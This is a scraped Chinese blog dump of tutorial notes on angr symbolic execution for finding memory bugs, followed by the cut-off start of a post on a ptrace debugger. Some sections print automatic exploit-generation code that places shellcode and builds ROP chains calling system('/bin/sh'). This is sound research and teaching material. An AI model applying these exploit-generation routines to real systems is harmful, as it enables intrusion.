0\n\n# this assumes we have symbols for the binary\n&gt;&gt;&gt; project.hook_symbol('main', BugFree())\n\n# Run a quick execution!\n&gt;&gt;&gt; simgr = project.factory.simulation_manager()\n&gt;&gt;&gt; simgr.run()  # step until no more active states\nProgram running with argc=&lt;SAO &lt;BV64 0x0&gt;&gt; and argv=&lt;SAO &lt;BV64 0x7fffffffffeffa0&gt;&gt;\n&lt;SimulationManager with 1 deadended&gt;\n\n该例子展示了对于main函数的hook，导致main函数不再执行，而是执行BugFree，这项功能的一个重要作用就是替换库函数：\n\nExecution Engines\n\n\n\n\n\n\n\n\nhttps://docs.angr.io/core-concepts/simulation\n​        对于二进制分析工作来说，必须要了解的就是执行引擎了，当二进制分析人员指定angr进行step执行等工作的时候，虽然是静态分析，但是也必须存在一些东西真的执行相关动作，执行引擎其实包含很多不同的引擎，一般来说会按照默认情况执行：\n\nThe failure engine kicks in when the previous step took us to some uncontinuable state\nThe syscall engine kicks in when the previous step ended in a syscall\nThe hook engine kicks in when the current address is hooked\nThe unicorn engine kicks in when the UNICORN state option is enabled and there is no symbolic data in the state\nThe VEX engine kicks in as the final fallback.\n\n不过就日常使用，最关键的还是对SimSuccessors，breakpoints这些概念的理解，上面的这些引擎也是在project.factory.successors(state, **kwargs)的驱动下进行的，对于引擎的step, run等执行操作，也非常依赖successors，如下：\ndef step_state(self, state, successor_func=None, error_list=None, **run_args):\n    \"\"\"\n    Don't use this function manually - it is meant to interface with exploration techniques.\n    \"\"\"\n    error_list = error_list if error_list is not None else self._errored\n    try:\n        successors = self.successors(state, successor_func=successor_func, **run_args)\n        stashes = {None: successors.flat_successors,\n                   'unsat': successors.unsat_successors,\n                   'unconstrained': successors.unconstrained_successors}\n\n    except (SimUnsatError, claripy.UnsatError) as e:\n        if LAZY_SOLVES not in state.options:\n            error_list.append(ErrorRecord(state, e, sys.exc_info()[2]))\n            stashes = {}\n        else:\n            stashes = {'pruned': [state]}\n\n        if self._hierarchy:\n            self._hierarchy.unreachable_state(state)\n            self._hierarchy.simplify()\n\n    except claripy.ClaripySolverInterruptError as e:\n        resource_event(state, e)\n        stashes = {'interrupted': [state]}\n\n    except tuple(self._resilience) as e:\n        error_list.append(ErrorRecord(state, e, sys.exc_info()[2]))\n        stashes = {}\n\n    return stashes\n\n上述的这些step操作返回的都是SimSuccessors object，它的核心作用在于给successor states打标签，其实就是对下一步的操作进行标记，然后分类存储。为了理解不同类型的successor states，你必须对符号约束有深刻的理解，官网讲的也挺详细的，我就不赘述了，初学者见到guard这个概念可能会懵，但是简单来说这其实就是用来标记Angr block之间的跳转关系的。\nSymbolic memory addressing\n\n\n\n\n\n\n\n\nhttps://github.com/angr/angr-doc/blob/master/docs/concretization_strategies.md\n​        为了了解符号执行，必须知道Symbolic memory addressing，angr支持Symbolic memory addressing，这意味着内存的offset可以被符号化，同时当进行一个写操作的时候会将符号地址具体化，当然符号化的过程也是可以通过策略配置的。在策略方面也是存在写策略和读策略state.memory.read_strategies，state.memory.write_strategies，这些策略会按顺序调用，直到某个策略可以将符号地址具体化，比较关键的一点在于：\n​         By setting your own concretization strategies (or through the use of SimInspect address_concretization breakpoints, described above), you can change the way angr resolves symbolic addresses.\n不过看文档，在进行读操作的时候也存在具体化策略。\nSolver Engine\n\n\n\n\n\n\n\n\nhttps://docs.angr.io/core-concepts/solver\n​        Angr的强大不仅在于它作为一个模拟器，更在于它强大的符号执行能力，这一能力的基础就来源于Solver Engine，angr的symbolic variables表示为一个符号，just a name，但是在用符号变量执行算术操作的时候会生成一个操作数，类似编译原理里面的AST，AST可以被转换为SMT solver的约束，经典的SMT solver就是z3。所以为了更好的使用angr，必须深刻了解Solver Engine。\n# Create a bitvector symbol named \"x\" of length 64 bits\n&gt;&gt;&gt; x = state.solver.BVS(\"x\", 64)\n&gt;&gt;&gt; x\n&lt;BV64 x_9_64&gt;\n&gt;&gt;&gt; y = state.solver.BVS(\"y\", 64)\n&gt;&gt;&gt; y\n&lt;BV64 y_10_64&gt;\n\nx, y 就是一个符号变量，使用它们进行操作你不会直接得到一个结果，而是得到一个AST。\n&gt;&gt;&gt; x + one\n&lt;BV64 x_9_64 + 0x1&gt;\n\n&gt;&gt;&gt; (x + one) / 2\n&lt;BV64 (x_9_64 + 0x1) / 0x2&gt;\n\n&gt;&gt;&gt; x - y\n&lt;BV64 x_9_64 - y_10_64&gt;\n\nlet’s learn how to process ASTs.每一个AST都有一个.op和一个.args，op代表一个操作的string name，args则代表一个操作的input参数，Unless the op is BVV or BVS (or a few others…), the args are all other ASTs, the tree eventually terminating with BVVs or BVSs. （差不多意思就是数都以变量结尾）\n&gt;&gt;&gt; tree = (x + 1) / (y + 2)\n&gt;&gt;&gt; tree\n&lt;BV64 (x_9_64 + 0x1) / (y_10_64 + 0x2)&gt;\n&gt;&gt;&gt; tree.op\n'__floordiv__'\n&gt;&gt;&gt; tree.args\n(&lt;BV64 x_9_64 + 0x1&gt;, &lt;BV64 y_10_64 + 0x2&gt;)\n&gt;&gt;&gt; tree.args[0].op\n'__add__'\n&gt;&gt;&gt; tree.args[0].args\n(&lt;BV64 x_9_64&gt;, &lt;BV64 0x1&gt;)\n&gt;&gt;&gt; tree.args[0].args[1].op\n'BVV'\n&gt;&gt;&gt; tree.args[0].args[1].args\n(1, 64)\n\n除了符号变量之外还有一个重要的概念就是符号约束。任何两个AST之间执行比较操作将产生一个新的AST，不是一个bitvector，而是一个符号化的布尔值（symbolic boolean）.\n&gt;&gt;&gt; x == 1\n&lt;Bool x_9_64 == 0x1&gt;\n&gt;&gt;&gt; x == one\n&lt;Bool x_9_64 == 0x1&gt;\n&gt;&gt;&gt; x &gt; 2\n&lt;Bool x_9_64 &gt; 0x2&gt;\n&gt;&gt;&gt; x + y == one_hundred + 5\n&lt;Bool (x_9_64 + y_10_64) == 0x69&gt;\n&gt;&gt;&gt; one_hundred &gt; 5\n&lt;Bool True&gt;\n&gt;&gt;&gt; one_hundred &gt; -5\n&lt;Bool False&gt;\n\n必须记住的一点是比较操作默认是无符号的，因为-5代表的是&lt;BV64 0xfffffffffffffffb&gt;，因为-5实际上小于one_hunderd，但是因为是无符号操作，所以得到的结果才是False。为了使用有符号操作，必须one_hundred.SGT(-5) (that’s “signed greater-than”)，angr在比较中的一些操作有自己的独特定义，可以看文档。\n​        同时必须记住不能将两个变量之间的比较作为if或者while语句的条件，因为结果可能不会是一个精确的值，应该使用solver.is_true  and  solver.is_false，which test for concrete truthyness/falsiness without performing a constraint solve.\n&gt;&gt;&gt; yes = one == 1\n&gt;&gt;&gt; no = one == 2\n&gt;&gt;&gt; maybe = x == y\n&gt;&gt;&gt; state.solver.is_true(yes)\nTrue\n&gt;&gt;&gt; state.solver.is_false(yes)\nFalse\n&gt;&gt;&gt; state.solver.is_true(no)\nFalse\n&gt;&gt;&gt; state.solver.is_false(no)\nTrue\n&gt;&gt;&gt; state.solver.is_true(maybe)\nFalse\n&gt;&gt;&gt; state.solver.is_false(maybe)\nFalse\n\n接下来一个比较重要的概念就是约束求解Constraint Solving，你可以将所有符号布尔值作为关于符号变量的有效值的断言，并将其作为约束加入到state，然后可以对符号表达式进行求解来获取一个合适的具体值。\n&gt;&gt;&gt; state.solver.add(x &gt; y)\n&gt;&gt;&gt; state.solver.add(y &gt; 2)\n&gt;&gt;&gt; state.solver.add(10 &gt; x)\n&gt;&gt;&gt; state.solver.eval(x)\n4\n\n值得注意的事如果state.solver.eval(y)，则结果也会是4，因为如果两次查询之间没有添加任何约束，两次查询的结果会相同。（文档这么说，但是我觉得不一定）\n\n同时Angr还支持浮点数和很多Solving methods，需要的时候可以参考上面的文档链接。\nVex IR infro\n\n\n\n\n\n\n\n\nhttps://github.com/angr/angr-doc/blob/master/docs/paths.md\n\nWorking with Data and Conventions\n\n\n\n\n\n\n\n\nhttps://docs.angr.io/advanced-topics/structured_data\n​        angr有自己的类型系统，这些SimType可以在angr.types里面发现，不同的类型在不同的架构里面具备不同的size，可以通过ty.with_arch(arch)来查看某个类型对应的指定架构的信息，同时angr有一个wrapper叫做pycparser，是一个C解析器，它提供很多强大的功能。\n\n\n\n\n\n\n\n\n\nhttps://docs.angr.io/advanced-topics/structured_data#working-with-calling-conventions\n​        angr有自己的调用约定叫做SimCC，可以通过p.factory.cc(..)来创建实例，一般来说，angr会根据客户机的系统和架构自己确定调用约定，如果无法确定，可以在angr.calling_conventions里面找到一个进行手工指定。详细细节可以参考链接，这里主要说一下callable，因为它经常用于漏洞挖掘工作。如果想定义一个callable，必须有函数地址和调用约定以及参数和返回值，像之前说的调用约定可以angr自动判断，那么参数和返回值必须人工设定：\ncharstar = angr.sim_type_.parse_type(\"char *\")\nprototype = angr.sim_type.SimTypeFunction((charstar,), angr.sim_type.SimTypeInt(False))\n\n上面的prototype就是一个参数和返回值的类型，然后通过下面：\ncc = p.factory.cc(func_ty=prototype)\n\n的方式进行调用约定的创建，然后通过如下：\ncheck_func = p.factory.callable(find_func.addr, concrete_only=False, cc=cc)\n\n的方式创建callable，这里的concrete_only是False，因为这样才能开启符号化的参数，不过目前默认就是关闭的，可以看api doc注释：\n\n\n\n\n\n\n\n\n\n\nconcrete_only– Throw an exception if the execution splits into multiple states\n\n下面是使用具体值和符号变量的两种方式：\nmy_args = [\"abcd\", \"96\", \"87\", \"55\", \"qqqq\"]\n\nprint(\"[+] Running angr callable with concrete arguments\")\nfor arg in my_args:\n    ret_val = check_func(arg)\n    stdout = check_func.result_state.posix.dumps(1)\n\n    print(\"Input  : {}\".format(arg))\n    print(\"Stdout : {}\".format(stdout))\n\n符号变量：\n#Does not return\nmy_sym_arg = claripy.BVS('my_arg', 10*8) #10 byte long str\nret_val = check_func(my_sym_arg)\nstdout = check_func.result_state.posix.dumps(1)\nprint(\"Stdout : {}\".format(stdout))\n\n事实上，callable对具体值的分析和跟踪更有效果，如果使用符号化变量的话，直到所有的路径全部执行完毕才会返回结果，这很可能招致路径爆炸问题进而耗费完所有的内存。为了解决这个问题可以使用call state，这样的话，angr会初始化一个状态来调用单个函数，对于callable来说，它会创建一个状态然后运行直到所有路径遍历，但是call sate可以使用simulation manager提供的探索func和step运行功能来缓解callable的问题。\nmy_sym_arg = claripy.BVS('my_arg', 10*8) #10 byte long str\n#Same calling convention from earlier\nstate = p.factory.call_state(find_func.addr, my_sym_arg, cc=cc)\nsimgr = p.factory.simgr(state)\nsimgr.explore(find=crack_me_good_addr)\nfound_state = simgr.found[0]\nmy_input = found_state.se.eval(my_sym_arg, cast_to=bytes).decode(\"utf-8\", \"ignore\")\nprint(\"One solution : {}\".format(my_input))\n\n不过对于一个simulation manager来说，在探索的时候可以加入step_func来实现内存漏洞的挖掘。\nsimgr.explore(find=crack_me_good_addr, step_func=check_mem_corruption)\n\n分析例子\n\n\n\n\n\n\n\n\n例子都在angr官方的examples里面，我就不多说内容了，只写结论，想要了解还是自己动手操作一波。\nstrcpy_find\n\n\n\n\n\n\n\n\n该例子主要是为了帮助学习寻找内存错误问题。\n​        该代码例子中出现：\ncfg = project.analyses.CFG(fail_fast=True)\n\n这将使得angr无视错误继续向下处理，一定程度上加快angr的分析速度。同时该例子其实利用了程序的特点，从argv进行参数的输入，然后利用对于strcpy参数的分析来判断strcpy的参数是否可控，进而判断是否具备发生漏洞的潜在可能。\n​        这种思想的潜在推广就是对所有的内存处理函数进行推广，然后判断漏洞是否产生。\nCADET​        这个是一个对于栈溢出的检测，这里得到了关于unconstrained state最直接的解释：\n#overwriting the return pointer with user-controllable data will generate\n#an \"unconstrained\" state: the symbolic executor does not know how to proceed\n#since the instruction pointer can assume any value\n\n#by default angr discards unconstrained paths, so we need to specify the  \n#save_unconstrained option\n\n但是angr默认情况下会丢弃unconstained path，因此在启动的时候需要进行设置：\nsm = project.factory.simulation_manager(save_unconstrained=True)\n\n但是这个例子存在一个问题就是，x86版本的例子直接通过step()是没办法直接获取到unconstrained状态的。其他的就没啥很特别的了。\ngrub​        这个用到了特殊的库，先看一个文档提示：\n\n\n\n\n\n\n\n\n\nif auto_load_libs is False, then external functions are unresolved, and Project will resolve them to a generic “stub” SimProcedure called ReturnUnconstrained. It does what its name says: it returns a unique unconstrained symbolic value each time it is called.\n在准备阶段，作者做的很好：\nproject = angr.Project('crypto.mod', auto_load_libs=False)\n\n# use libc functions as stand-ins for grub functions\nmemset = angr.SIM_PROCEDURES['libc']['memset']\ngetchar = angr.SIM_PROCEDURES['libc']['getchar']\ndo_nothing = angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained']\n\nproject.hook_symbol('grub_memset', memset())\nproject.hook_symbol('grub_getkey', getchar())\n\n# I don't know why, but grub_xputs is apparently not the function but a pointer to it?\nxputs_pointer_addr = project.loader.find_symbol('grub_xputs').rebased_addr\nxputs_func_addr = project.loader.extern_object.allocate()\nproject.hook(xputs_func_addr, do_nothing())\nproject.loader.memory.pack_word(xputs_pointer_addr, xputs_func_addr)\n\n​        这里作者直接对目标函数进行了hook使得他们在模拟执行的时候可以正常运行，然后自写了angr的探索策略，通过直接对目标函数进行模拟的方法来进行漏洞挖掘。最后调用的是find_bug来解决问题，这里特殊的是利用了call_state来初始化状态。同时采用了use_technique的方法自写探索策略，他写的探索策略有一些优点，比如过滤了大量的重复状态，这极大的节省了符号执行过程中的性能消耗。\n崩溃结果：input: b’\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\r’\n原因：\n\n\n\n\n\n\n\n\n\n根据你提供的输入，我们可以看到你输入了12个退格符(\\x08)和一个回车符(\\r)。在grub_password_get函数中，当输入的字符是退格符时，会将输入的指针回退一个字节（即向左移动一个字符）。因此，这个输入实际上是将初始缓冲区中的前11个字符删除掉，并在最后输入了一个回车符，表示输入结束。\n在angr执行时，它尝试通过符号执行模拟这个函数的执行，它会在第一个循环迭代中执行grub_getkey()并获得输入的第一个字符。由于输入的第一个字符是退格符，它会将当前输入指针向左移动一个字符，并继续等待下一个输入字符。在第二次迭代中，angr又执行了grub_getkey()，但是由于输入指针已经被移动了一个字符，这个时候输入指针已经指向了地址0处。因此，在angr执行到地址0处时，会引发SimUnsatError异常，表示出现了不可满足的情况。这通常是由于符号执行过程中出现了不一致或无法解决的约束条件，导致无法继续进行符号执行。\nInsomnihack Simple AEG​        这里面的demo是一个很简单的缓冲区溢出的漏洞（堆溢出），作者采用的方法是直接不断的对simgr 进行step()，直到目标出现不可约束状态，在找到不可约束状态之后对其是否可以符号化进行判断：\ndef fully_symbolic(state, variable):\n    '''\n    check if a symbolic variable is completely symbolic\n    '''\n\n    for i in range(state.arch.bits):\n        if not state.solver.symbolic(variable[i]):\n            return False\n\n    return True\n\n这样可以证明，目标状态的跳转地址是否可控，以此来判断目标是一个可控的漏洞，接下来就是判断能不能在这个状态里面找到用户可控的缓冲区：\ndef find_symbolic_buffer(state, length):\n    '''\n    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's\n    control\n    '''\n\n    # get all the symbolic bytes from stdin\n    stdin = state.posix.stdin\n\n    sym_addrs = [ ]\n    for _, symbol in state.solver.get_variables('file', stdin.ident):\n        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))\n\n    for addr in sym_addrs:\n        if check_continuity(addr, sym_addrs, length):\n            yield addr\n\n然后利用check_continuity来判断内存是否足够容纳shellcode:\ndef check_continuity(address, addresses, length):\n    '''\n    dumb way of checking if the region at 'address' contains 'length' amount of controlled\n    memory.\n    '''\n\n    for i in range(length):\n        if not address + i in addresses:\n            return False\n\n    return True\n\n不过，这里的话，我感觉直接用shellcode的最大长度判断不就可以了吗？不理解为啥要从最小长度开始遍历。不过这个不是重点，接下来找到地址之后对状态添加额外约束：\nl.info(\"found symbolic buffer at %#x\", buf_addr)\nmemory = ep.memory.load(buf_addr, len(shellcode))\nsc_bvv = ep.solver.BVV(shellcode)\n\n# check satisfiability of placing shellcode into the address\nif ep.satisfiable(extra_constraints=(memory == sc_bvv,ep.regs.pc == buf_addr)):\n    l.info(\"found buffer for shellcode, completing exploit\")\n    ep.add_constraints(memory == sc_bvv)\n    l.info(\"pointing pc towards shellcode buffer\")\n    ep.add_constraints(ep.regs.pc == buf_addr)\n\n如果状态可以满足这些约束，那么就将这些约束添加到状态里面进行求解，直接拿到了exp。但是也有一些缺陷，单单从是否跑出unconstrained state并且判断每一个bit是否可以符号化来判断是否存在可控的内存问题非常消耗性能。同时，还有一个非常致命的缺陷，那就是如果在符号执行的过程中很可能存在没有触发漏洞的情况。经典的例子就是，目标的缓冲区和目标写入的大小相近。这表明其实利用符号执行来直接进行漏洞挖掘其实非常困难。\n优化def check_mem_corruption(simgr):\n    if len(simgr.unconstrained):\n        for path in simgr.unconstrained:\n            if path.satisfiable(extra_constraints=[path.regs.pc == b\"CCCC\"]):\n                path.add_constraints(path.regs.pc == b\"CCCC\")\n                if path.satisfiable():\n                    simgr.stashes['mem_corrupt'].append(path)\n                simgr.stashes['unconstrained'].remove(path)\n                simgr.drop(stash='active')\n    return simgr\n\n\n相比于之前的逐比特符号化判断+地址是否可控的形式，这样显然更加直接，但是缺点在于没有直接把shellcode考虑进去，不过加入shellcode的判断也确实太有针对性，不适合广泛利用，下面是一个demo：\nimport angr, argparse, IPython\n\ndef check_mem_corruption(simgr):\n    if len(simgr.unconstrained):\n        for path in simgr.unconstrained:\n            if path.satisfiable(extra_constraints=[path.regs.pc == b\"CCCC\"]):\n                path.add_constraints(path.regs.pc == b\"CCCC\")\n                if path.satisfiable():\n                    simgr.stashes['mem_corrupt'].append(path)\n                simgr.stashes['unconstrained'].remove(path)\n                simgr.drop(stash='active')\n    return simgr\n\ndef main():\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument(\"Binary\")\n    parser.add_argument(\"Start_Addr\", type=int)\n\n    args = parser.parse_args()\n\n    p = angr.Project(args.Binary)\n    state = p.factory.blank_state(addr=args.Start_Addr)\n    \n    simgr = p.factory.simgr(state, save_unconstrained=True)\n    simgr.stashes['mem_corrupt']  = []\n    \n    simgr.explore(step_func=check_mem_corruption)\n\n    IPython.embed()\n    \nif __name__ == \"__main__\":\n    main()\n\n\nAutomatic rop chain generation\n\n\n\n\n\n\n\n\nhttps://github.com/ChrisTheCoolHut/Auto_rop_chain_generation\n​        之前大多讲的是buffer over flow的内存问题的发现，但是rop chain的生成也十分的重要，不过比起问题的发现，这一块的内容可能还更为复杂一点，对于rop chain的构建，基本的步骤如下：\n\ngadget finding\ngadget chaining\nConstraint applying\nstate emulation\n\n如下：\ndef get_rop_chain(state):\n\n    \"\"\"\n    We're using a copy of the original state since we are applying\n    constraints one at a time and stepping through the state.\n    \"\"\"\n    state_copy = state.copy()\n\n    binary_name = state.project.filename\n\n    pwntools_elf = ELF(binary_name)\n\n    \"\"\"\n    Here we're getting the ropchain bytes and rop chain object\n    that has the individual gadget addresses and values\n    \"\"\"\n    rop_object, rop_chain = generate_standard_rop_chain(binary_name)\n\n    \"\"\"\n    Here we're running through the program state and setting\n    each gadget.\n    \"\"\"\n    user_input, new_state = do_64bit_rop_with_stepping(\n        pwntools_elf, rop_object, rop_chain, state_copy\n    )\n\n    \"\"\"\n    With our constraints set, our binary's STDIN\n    should now contain our entire overflow + ropchain!\n    \"\"\"\n    input_bytes = new_state.posix.dumps(0)\n\n    return input_bytes\n\n经常打CTF的同学估计找到，对于rop chain的寻找和构建都可以利用pwntools的强大功能：\ndef generate_standard_rop_chain(binary_path):\n    context.binary = binary_path\n    elf = ELF(binary_path)\n    rop = ROP(elf)\n\n    # These are strings we want to call\n    strings = [b\"/bin/sh\\x00\", b\"/bin/bash\\x00\"]\n    functions = [\"system\", \"execve\"]\n\n    \"\"\"\n    The two main components we need in our rop chain\n    is either a system() or exec() call and a refernce\n    to the string we want to call (/bin/sh)\n    \"\"\"\n    ret_func = None\n    ret_string = None\n\n    \"\"\"\n    angr can find these functions using the loader reference\n    p.loader, however we'll need to use pwntools for the rop\n    chain generation anyways, so we'll just stick with pwntools\n    \"\"\"\n    for function in functions:\n        if function in elf.plt:\n            ret_func = elf.plt[function]\n            break\n        elif function in elf.symbols:\n            ret_func = elf.symbols[function]\n            break\n\n    # Find the string we want to pass it\n    for string in strings:\n        str_occurences = list(elf.search(string))\n        if str_occurences:\n            ret_string = str_occurences[0]\n            break\n\n    if not ret_func:\n        raise RuntimeError(\"Cannot find symbol to return to\")\n    if not ret_string:\n        raise RuntimeError(\"Cannot find string to pass to system or exec call\")\n\n    # movabs fix\n    \"\"\"\n    During amd64 ropchaining, there is sometimes a stack alignment\n    issue that folks call the `movabs` issue inside of a system()\n    call.Adding a single rop-ret gadget here fixes that.\n    \"\"\"\n    rop.raw(rop.ret.address)\n\n    \"\"\"\n    The pwntools interface is nice enough to enable us to construct\n    our chain with a rop.call function here.\n    \"\"\"\n    rop.call(ret_func, [ret_string])\n\n    log.info(\"rop chain gadgets and values:\\n{}\".format(rop.dump()))\n\n    \"\"\"\n    We need both the generated chain and gadget addresses for when\n    we contrain theprogram state to execute and constrain this chain,\n    so we pass back both the rop tools refernce along with the chain.\n    \"\"\"\n    return rop, rop.build()\n\n通过上述的方法可以实现对于rop chain的创建，但是还需要对其进行约束处理和模拟验证。\n​        当我们的rop chain使用一个目标中存在的func的时候会有一个问题，因为angr在模拟执行的时候使用的是SimProcedures来提升速度和精确度而不是直接使用 real func，当模拟的过程中遇到procedures那么rop调用链就会被打破，因为没有跳转到real func上面，所以当我们步入procedures的时候直接设置pc指针到对应的real func。\nif new_state.satisfiable(extra_constraints=([new_state.regs.pc == gadget])):\n    \"\"\"\n    For the actual ROP gadgets, we're stepping through them\n    until we hit an unconstrained value - We did a `ret` back\n    onto the symbolic stack.\n    This process is slower than just setting the whole stack\n    to the chain, but in testing it seems to work more reliably\n    \"\"\"\n    log.info(\"Setting PC to {}\".format(hex(gadget)))\n    new_state.add_constraints(new_state.regs.pc == gadget)\n\n    \"\"\"\n    Since we're emulating the program's execution with angr we\n    will run into an issue when executing any symbols. Where a\n    SimProcedure will get executed instead of the real function,\n    which then gives us the wrong constraints/execution for our\n    rop_chain\n    \"\"\"\n    if gadget in elf_symbol_addrs:\n        log.info(\n            \"gadget is hooked symbol, contraining to real address, but calling SimProc\"\n        )\n        symbol = [x for x in elf.symbols.items() if gadget == x[1]][0]\n        p = new_state.project\n        new_state.regs.pc = p.loader.find_symbol(symbol[0]).rebased_addr\n\n    \"\"\"\n    There is no point in letting our last gadget run, we have all\n    the constraints on our input to trigger the leak\n    \"\"\"\n    if i == len(rop_chain) - 1:\n        break\n\n    \"\"\"\n    Since we're stepping through a ROP chain, VEX IR wants to\n    try and lift the whole block and emulate a whole block step\n    this will break what we're trying to do, so we need to\n    tell it to try and emulate single-step execution as closely\n    as we can with the opt_level=0    \n    \"\"\"\n    rop_simgr = new_state.project.factory.simgr(new_state)\n    rop_simgr.explore(opt_level=0)\n    new_state = rop_simgr.unconstrained[0]\n\n但是在rop chain里面存在很多对于堆栈和寄存器的数据设置，因此这个时候需要根据rop chain的内容设置期待的约束：\n\"\"\"\nCase 2: We're setting a register to an expected popped value\n\nUsually for 64bit rop chains, we're passing values into\nthe argument registers like RDI.\n\"\"\"\nnext_reg = curr_rop.regs.pop()\nlog.debug(\"Setting register : {}\".format(next_reg))\n\ngadget_msg = gadget\nif isinstance(gadget, int):\n    gadget_msg = hex(gadget)\n\nstate_reg = getattr(new_state.regs, next_reg)\nif state_reg.symbolic and new_state.satisfiable(\n    extra_constraints=([state_reg == gadget])\n):\n\n    log.info(\"Setting {} to {}\".format(next_reg, gadget_msg))\n\n    new_state.add_constraints(state_reg == gadget)\nelse:\n    log.error(\"unsatisfied on {} -&gt; {}\".format(next_reg, gadget_msg))\n    break\n\nif len(curr_rop.regs) == 0:\n    curr_rop = None\n\nangr符号执行用于漏洞挖掘的推论\n\n\n\n\n\n\n\n\n我也是菜逼，如果大佬们有啥好办法，欢迎一起讨论一起进步。\n\n如果只是单单利用step()以期望产生无法约束的状态来进行漏洞挖掘效果非常不稳定，问题的来源可能是在符号执行的过程中，产生的约束导致state异常存在不稳定的情况，同样的约束内有的求解方案可能就不会导致异常，这就可能导致漏洞错过，但是具体原因我还不清楚，后面会继续探索。\n还有一种方法是利用自定义的探索策略，不过好像并不能很好的解决上述问题。\n在实战漏洞挖掘中，笔者在IOT领域进行了实验，angr在整个符号传递过程中，极其容易受到硬件相关函数影响导致符号传播中断，目前也没有很好的方案来解决这个问题，笔者尝试利用推测下一阶段跳转的方法绕过硬件相关函数，但是这还是会导致大范围的不稳定状态出现以及数据流中断问题，如果利用SimProcess来进行angr hook的话，这会导致巨大的工作量，而且还要极大工作量的更新和维护，基本上与自动化的初衷背离。\n\n","slug":"Angr Taint Analysis","date":"2023-03-14T07:07:45.000Z","categories_index":"漏洞挖掘","tags_index":"漏洞挖掘","author_index":"RainSec"},{"id":"a9b1e85dae1254bf8475b6c81571a4ad","title":"实现一个简单的调试器","content":"实现一个简单的调试器​    以经典的GDB为例其项目代码共有十几万行代码，但是很多情况下只会使用到几个常用功能：单步，断点，查看变量，线程/进程切换。而GDB基本上是依赖于ptrace系统调用，主要用于编写调试程序。大部分实现思路参考Writing a Linux Debugger Part 2: Breakpoints (tartanllama.xyz)系列文章，强烈推荐阅读\n目标功能：\n\n单步\n断点\n查看内存/寄存器\n查看汇编\n\nptrace 原理​    先来看看ptrace系统调用的函数签名：\n#include &lt;sys/ptrace.h&gt;\n\nlong ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);\n/*DESCRIPTION\n       The  ptrace()  system  call  provides  a  means  by  which one process (the\n       \"tracer\") may observe and control the execution  of  another  process  (the\n       \"tracee\"), and examine and change the tracee's memory and registers.  It is\n       primarily used to implement breakpoint debugging and system call tracing.\n\t   即ptrace系统调用提供给tracer控制，读取，修改另一个进程(tracee)的能力，由此可以实现断点和系统调用追踪\n\t   \n       A tracee first needs to be attached to the tracer.  Attachment  and  subse‐\n       quent commands are per thread: in a multithreaded process, every thread can\n       be individually attached to a (potentially different) tracer, or  left  not\n       attached  and  thus  not debugged.  Therefore, \"tracee\" always means \"(one)\n       thread\", never \"a (possibly multithreaded) process\".  Ptrace  commands  are\n       always sent to a specific tracee using a call of the form\n       即tracer通过ptrace进行附加(attach)和发送命令都是针对某一个线程的而不是进程\n*/\n\n\nrequest：调试者(tracer)要执行的操作，常见的有PTRACE_TRACEME，PTRACE_ATTACH，PTRACE_PEEKUSER，PTRACE_SINGLESTEP等\npid：被调试进程(tracee)pid\naddr：要读写的内存地址\ndata：如果要向目标进程写入数据那么data就是我们数据地址；如果要读取目标进程数据那么data就是保留数据的地址\n\nptrace系统调用会根据不同的request完成不同功能如：\n\nPTRACE_TRACEME：表示此进程即将被父进程trace，此时其他参数被忽略\nPTRACE_PEEKTEXT, PTRACE_PEEKDATA：读取tracee在addr(虚拟内存空间)处的一个字，返回值就是读取到的字\nPTRACE_PEEKUSER：读取tracee的USER area，其包含了该进程的寄存器以及其他信息\nPTRACE_POKETEXT, PTRACE_POKEDATA：复制data所指向的一个字到tracee的addr(虚拟内存空间)处\nPTRACE_POKEUSER：复制data所指的一个字带tracee的USER area\nPTRACE_GETREGS, PTRACE_GETFPREGS：复制tracee的通用寄存器或者浮点寄存器到tracer的data所指的位置，addr被忽略\nPTRACE_SETREGS, PTRACE_SETFPREGS：修改tracee的通用寄存器或者浮点寄存器\nPTRACE_CONT：运行被暂停的tracee进程。如果data参数非0那么就表示data是传给tracee的信号数值\nPTRACE_SYSCALL, PTRACE_SINGLESTEP：运行被暂停的tracee进程就像PTRACE_CONT功能，不同的是PTRACE_SYSCALL表示运行到下一个系统调用(进入或返回)，PTRACE_SINGLESTEP表示仅运行一条指令便停止\n\n以下是Linux-2.4.16内核的ptrace系统调用内部实现源码：\nasmlinkage int sys_ptrace(long request, long pid, long addr, long data)\t\t//asmlinkage是指明该函数用堆栈来传递参数\n{\n\tstruct task_struct *child;\n\tstruct user * dummy = NULL;\n\tint i, ret;\n\n\tlock_kernel();\n\tret = -EPERM;\n\tif (request == PTRACE_TRACEME) {\t\t/*检查traced状态是否重复*/\n\t\t/* are we already being traced? */\n\t\tif (current-&gt;ptrace &amp; PT_PTRACED)\n\t\t\tgoto out;\n\t\t/* set the ptrace bit in the process flags. */\n\t\tcurrent-&gt;ptrace |= PT_PTRACED;\t\t//current指向当前进程(task_struct)，因此PTRACE_TRACEME将当前进程设置为PT_PTRACED状态(traced)即被trace者(tracee)\n\t\tret = 0;\n\t\tgoto out;\n\t}\n\tret = -ESRCH;\n\tread_lock(&amp;tasklist_lock);\t\t\t\t//调度链表上读锁\n\tchild = find_task_by_pid(pid);\t\t\t//获取目标pid进程结构体(task_struct)\n\tif (child)\n\t\tget_task_struct(child);\n\tread_unlock(&amp;tasklist_lock);\n\tif (!child)\n\t\tgoto out;\n\n\tret = -EPERM;\n\tif (pid == 1)\t\t/* you may not mess with init */\n\t\tgoto out_tsk;\n\t/*就像gdb有直接启动并调试一个程序和附加一个进程并调试两个功能，也是基于ptrace的PTRACE_ATTACH让目标进程处于traced状态*/\n\tif (request == PTRACE_ATTACH) {\n\t\tret = ptrace_attach(child);\n\t\tgoto out_tsk;\n\t}\n\n\t...\n\t/*这就是ptrace的主体，通过switch case和request完成，这里先了解部分*/\n\tswitch (request) {\n\t/* when I and D space are separate, these will need to be fixed. */\n    /*PTRACE_PEEKTEXT，PTRACE_PEEKDATA功能相同都是从虚拟地址addr中读取数据到data指针中*/\n\tcase PTRACE_PEEKTEXT: /* read word at location addr. */ \n\tcase PTRACE_PEEKDATA: {\n\t\tunsigned long tmp;\n\t\tint copied;\n\n\t\tcopied = access_process_vm(child, addr, &amp;tmp, sizeof(tmp), 0);\n\t\tret = -EIO;\n\t\tif (copied != 